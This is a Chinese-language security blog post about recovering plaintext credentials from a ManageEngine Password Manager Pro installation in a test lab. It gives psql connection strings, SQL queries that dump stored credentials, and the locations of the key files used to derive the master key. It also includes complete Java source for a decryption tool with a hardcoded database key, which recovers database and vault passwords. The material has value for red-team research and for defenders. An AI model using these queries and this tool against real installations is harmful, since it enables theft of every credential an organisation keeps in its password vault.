---
layout: post
title: Password Manager Pro利用分析——数据解密
---


## 0x00 前言
---

在上篇文章《Password Manager Pro漏洞调试环境搭建》介绍了漏洞调试环境的搭建细节，经测试发现数据库的部分数据做了加密，本文将要介绍数据解密的方法。

## 0x01 简介
---

本文将要介绍以下内容：

- 数据加密的位置
- 解密方法
- 开源代码
- 实例演示

## 0x02 数据加密的位置
---

测试环境同《Password Manager Pro漏洞调试环境搭建》保持一致

数据库连接的完整命令：`"C:\Program Files\ManageEngine\PMP\pgsql\bin\psql" "host=127.0.0.1 port=2345 dbname=PassTrix user=pmpuser password=Eq5XZiQpHv"`

数据库连接成功，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2022-8-17/2-1.png)

常见的数据加密位置有以下三个：

#### (1)Web登录用户的口令salt

查询Web登录用户名的命令：`select * from aaauser;`

查询Web登录用户口令的命令：`select * from aaapassword;`

结果如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2022-8-17/2-2.png)

password的加密格式为`bcrypt(sha512($pass)) / bcryptsha512 *`，对应Hashcat的Hash-Mode为`28400`

其中，`salt`项被加密

#### (2)数据库高权限用户的口令

查询命令：`select * from DBCredentialsAudit;`

输出如下：

```
 username |                                                                         password                                                                         |   last_modified_time
----------+----------------------------------------------------------------------------------------------------------------------------------------------------------+-------------------------
 postgres | \xc30c0409010246e50cc723070408d23b0187325463ff95c0ff5c8f9013e7a37f424b5e0d1f2c11ce97c7184e112cd81536ac90937f99838124dee88239d9444ba8aff26f1a9ff29f22f4b5 | 2022-09-01 11:11:11.111
(1 row)
```

`password`项被加密

#### (3)保存的凭据

查询命令：`select * from ptrx_passbasedauthen;`

结果如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2022-8-17/2-3.png)

`password`项被加密

导出凭据相关完整信息的查询命令：

```
select ptrx_account.RESOURCEID, ptrx_resource.RESOURCENAME, ptrx_resource.DOMAINNAME, ptrx_resource.IPADDRESS, ptrx_resource.RESOURCEURL, ptrx_password.DESCRIPTION, ptrx_account.LOGINNAME, ptrx_passbasedauthen.PASSWORD from ptrx_passbasedauthen LEFT JOIN ptrx_password ON ptrx_passbasedauthen.PASSWDID = ptrx_password.PASSWDID LEFT JOIN ptrx_account ON ptrx_passbasedauthen.PASSWDID = ptrx_account.PASSWDID LEFT JOIN ptrx_resource ON ptrx_account.RESOURCEID = ptrx_resource.RESOURCEID;
```

**注：**

该命令引用自https://www.shielder.com/blog/2022/09/how-to-decrypt-manage-engine-pmp-passwords-for-fun-and-domain-admin-a-red-teaming-tale/

结果如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2022-8-17/2-4.png)

## 0x03 解密方法
---

加解密算法细节位于`C:\Program Files\ManageEngine\PMP\lib\AdventNetPassTrix.jar`中的`com.adventnet.passtrix.ed.PMPEncryptDecryptImpl.class`和`com.adventnet.passtrix.ed.PMPAPI.class`

解密流程如下:

#### (1)计算MasterKey

代码实现位置：`C:\Program Files\ManageEngine\PMP\lib\AdventNetPassTrix.jar`->`com.adventnet.passtrix.ed.PMPAPI.class`->`GetEnterpriseKey()`

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2022-8-17/3-1.png)

首先需要获得`enterpriseKey`，通过查询数据库获得，查询命令：`select NOTESDESCRIPTION from Ptrx_NotesInfo;`

输出为：

```
               notesdescription
----------------------------------------------
 D8z8c/cz3Pyu1xuZVuGaqI0bfGCRweEQsptj2Knjb/U=
(1 row)
```

这里可以得到`enterpriseKey`为`D8z8c/cz3Pyu1xuZVuGaqI0bfGCRweEQsptj2Knjb/U=`

解密`enterpriseKey`的实现代码：

```
enterpriseKey = getInstance().getPMPED().decryptPassword(enterpriseKey);
```

跟进一步，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2022-8-17/3-2.png)

解密的密钥通过`getPmp32BitKey()`获得，对应的代码实现位置：`C:\Program Files\ManageEngine\PMP\lib\AdventNetPassTrix.jar`->`com.adventnet.passtrix.ed.PMPAPI.class`->`get32BitPMPConfKey()`

代码实现细节如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2022-8-17/3-3.png)

这里需要先读取文件`C:\Program Files\ManageEngine\PMP\conf\manage_key.conf`获得`PMPConfKey`的保存位置，默认配置下输出为：`C:\Program Files\ManageEngine\PMP\conf\pmp_key.key`

查看`C:\Program Files\ManageEngine\PMP\conf\pmp_key.key`的文件内容：

```
ENCRYPTIONKEY=60XVZJQDEPzrTluVIGDY2y9q4x6uxWZanf2LUF2KBCM\=
```

通过动态调试发现，这里存在转义字符的问题，需要去除字符`\`，文件内容为`60XVZJQDEPzrTluVIGDY2y9q4x6uxWZanf2LUF2KBCM\=`，对应的`PMPConfKey`为`60XVZJQDEPzrTluVIGDY2y9q4x6uxWZanf2LUF2KBCM=`

至此，我们得到以下内容：

- PMPConfKey为`60XVZJQDEPzrTluVIGDY2y9q4x6uxWZanf2LUF2KBCM=`
- enterpriseKey为`D8z8c/cz3Pyu1xuZVuGaqI0bfGCRweEQsptj2Knjb/U=`

通过解密程序，最终可计算得出`MasterKey`为`u001JO4dpWI(%!^#`

#### (2)使用MasterKey解密数据库中的数据

数据库中的加密数据均是以`\x`开头的格式

解密可通过查询语句完成

解密数据库高权限用户口令的命令示例：`select decryptschar(password,'u001JO4dpWI(%!^#') from DBCredentialsAudit;`

输出如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2022-8-17/3-4.png)

这里直接获得了明文口令`N5tGp!R@oj`，测试该口令是否有效的命令：`"C:\Program Files\ManageEngine\PMP\pgsql\bin\psql" "host=127.0.0.1 port=2345 dbname=PassTrix user=postgres password=N5tGp!R@oj"`

连接成功，证实口令解密成功，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2022-8-17/3-5.png)

解密保存凭据的命令示例：`select ptrx_account.RESOURCEID, ptrx_resource.RESOURCENAME, ptrx_resource.DOMAINNAME, ptrx_resource.IPADDRESS, ptrx_resource.RESOURCEURL, ptrx_password.DESCRIPTION, ptrx_account.LOGINNAME, decryptschar(ptrx_passbasedauthen.PASSWORD,'u001JO4dpWI(%!^#') from ptrx_passbasedauthen LEFT JOIN ptrx_password ON ptrx_passbasedauthen.PASSWDID = ptrx_password.PASSWDID LEFT JOIN ptrx_account ON ptrx_passbasedauthen.PASSWDID = ptrx_account.PASSWDID LEFT JOIN ptrx_resource ON ptrx_account.RESOURCEID = ptrx_resource.RESOURCEID;`

输出如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2022-8-17/3-6.png)

提取出数据为`PcQIojSp6/fuzwXOMI1sYJsbCslfuppwO+k=`

#### (3)使用`PMPConfKey`解密得到最终的明文

通过解密程序，最终可计算得出明文为`iP-6pI24)-`

登录Web管理后台，确认解密的明文是否正确，如图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2022-8-17/3-7.png)

解密成功

## 0x03 开源代码
---

以上测试的完整实现代码如下：

```
import java.security.*;
import java.security.spec.InvalidKeySpecException;
import java.util.Base64;
import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.SecretKey;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.PBEKeySpec;
import javax.crypto.spec.SecretKeySpec;


class PimpMyPMP  {

    private static Cipher cipher;

    private void initCiper(byte[] aeskey, int opmode, byte[] ivArr) throws Exception {
        try {
            cipher = Cipher.getInstance("AES/CTR/PKCS5PADDING");
            SecretKeyFactory factory = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA1");
            PBEKeySpec spec = new PBEKeySpec((new String(aeskey, "UTF-8")).toCharArray(), new byte[]{1, 2, 3, 4, 5, 6, 7, 8}, 1024, 256);
            SecretKey temp = factory.generateSecret(spec);
            SecretKey secret = new SecretKeySpec(temp.getEncoded(), "AES");
            cipher.init(opmode, secret, new IvParameterSpec(ivArr));
        } catch (NoSuchAlgorithmException var8) {
            var8.printStackTrace();
            throw new Exception("Exception occurred while encrypting", var8);
        } catch (NoSuchPaddingException var9) {
            var9.printStackTrace();
            throw new Exception("Exception occurred while encrypting", var9);
        } catch (InvalidKeyException var10) {
            var10.printStackTrace();
            throw new Exception("Exception occurred while encrypting", var10);
        } catch (InvalidAlgorithmParameterException var11) {
            var11.printStackTrace();
            throw new Exception("Exception occurred while encrypting", var11);
        } catch (InvalidKeySpecException var12) {
            var12.printStackTrace();
            throw new Exception("Exception occurred while encrypting", var12);
        }
    }

    private byte[] getPasswordWOIv(byte[] password, int opmode) throws Exception {
        if (opmode == 1) {
            return password;
        } else {
            int pLen = password.length;
            byte[] pwdArr = new byte[pLen - 16];
            int j = 0;

            for(int i = 16; i < pLen; ++i) {
                pwdArr[j] = password[i];
                ++j;
            }

            return pwdArr;
        }
    }

    private byte[] getIvBytes(byte[] password, int opmode) throws Exception {

        byte[] ivbyteArr = new byte[16];
        if (opmode == 1) {
            SecureRandom srand = new SecureRandom();
            srand.nextBytes(ivbyteArr);
        } else if (opmode == 2) {
            for(int i = 0; i < 16; ++i) {
                ivbyteArr[i] = password[i];
            }
        }

        return ivbyteArr;
    }

    private byte[] padding(String password) {
        for(int i = password.length(); i < 32; ++i) {
            password = password + " ";
        }

        if (password.length() > 32) {
            try {
                return Base64.getDecoder().decode(password);
            } catch (IllegalArgumentException var3) {
                return password.getBytes();
            }
        } else {
            return password.getBytes();
        }
    }

    public byte[] decrypt(byte[] cipherText, String key) throws Exception {
        return this.decrypt(cipherText, this.padding(key));
    }
    public synchronized byte[] decrypt(byte[] cipherText, byte[] key) throws Exception {
        try {
            byte[] ivArr = this.getIvBytes(cipherText, 2);
            this.initCiper(key, 2, ivArr);
            byte[] cipherTextFinal = this.getPasswordWOIv(cipherText, 2);
            return cipher.doFinal(cipherTextFinal);
        } catch (IllegalBlockSizeException var5) {
            throw new Exception("Exception occurred while encrypting", var5);
        } catch (BadPaddingException var6) {
            throw new Exception("Exception occurred while encrypting", var6);
        }
    }

    private static String hardcodedDBKey() throws NoSuchAlgorithmException {
        String key = "@dv3n7n3tP@55Tri*".substring(5, 10);
        MessageDigest md = MessageDigest.getInstance("MD5");
        md.update(key.getBytes());
        byte[] bkey = md.digest();
        StringBuilder sb = new StringBuilder(bkey.length * 2);
        for(byte b: bkey) {
            sb.append(String.format("%02x", b));
        }
        return sb.toString();
    }

    public String decryptDatabasePassword(String encPassword) throws Exception {
        String decryptedPassword = null;
        if (encPassword != null) {
            try {
                decryptedPassword = this.decryptPassword(encPassword, PimpMyPMP.hardcodedDBKey());
            }
            catch (Exception e) {
                throw new Exception("Exception ocuured while decrypt the password");
            }
            return decryptedPassword;
        }
        throw new Exception("Password should not be Null");
    }
    
    public String decryptPassword(String encryptedPassword, String key) throws Exception {
        String decryptedPassword = null;
        if (encryptedPassword != null && !"".equals(encryptedPassword)) {
            try {
                byte[] encPwdArr = org.apache.commons.codec.binary.Base64.decodeBase64(encryptedPassword.getBytes());
                byte[] decryptedPwdArr = this.decrypt(encPwdArr, key);
                decryptedPassword = new String(decryptedPwdArr, "UTF-8");
            } catch (Exception var5) {
                var5.printStackTrace();
            }

            return decryptedPassword;
        } else {
            return encryptedPassword;
        }
    }
    
    public static void main(String[] args) {
        PimpMyPMP klass = new PimpMyPMP();
        try {
            String database_password = "fCYxcAlHx+u/J+aWJFgCJ3vz+U69Uj4i/9U=";
            String database_key = klass.decryptDatabasePassword(database_password);
            System.out.print("Database Key: ");
            System.out.println(database_key);

            String pmp_password = "60XVZJQDEPzrTluVIGDY2y9q4x6uxWZanf2LUF2KBCM=";
            String notesdescription = "D8z8c/cz3Pyu1xuZVuGaqI0bfGCRweEQsptj2Knjb/U=";
            String master_key = klass.decryptPassword(notesdescription, pmp_password);

            System.out.print("Master Key: ");
            System.out.println(master_key);

            String endata = "PcQIojSp6/fuzwXOMI1sYJsbCslfuppwO+k=";
            String password = klass.decryptPassword(endata,pmp_password);
            System.out.print("Passwd: ");
            System.out.println(password);
        } catch (Exception e){
            System.out.println("Fail!");
        }
    }
}
```

代码修正了https://www.shielder.com/blog/2022/09/how-to-decrypt-manage-engine-pmp-passwords-for-fun-and-domain-admin-a-red-teaming-tale/中在解密MasterKey时的Bug，更具通用性


## 0x04 小结
---

本文介绍了Password Manager Pro数据解密的完整方法，修正了https://www.shielder.com/blog/2022/09/how-to-decrypt-manage-engine-pmp-passwords-for-fun-and-domain-admin-a-red-teaming-tale/中在解密MasterKey时的Bug，更具通用性。

---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)
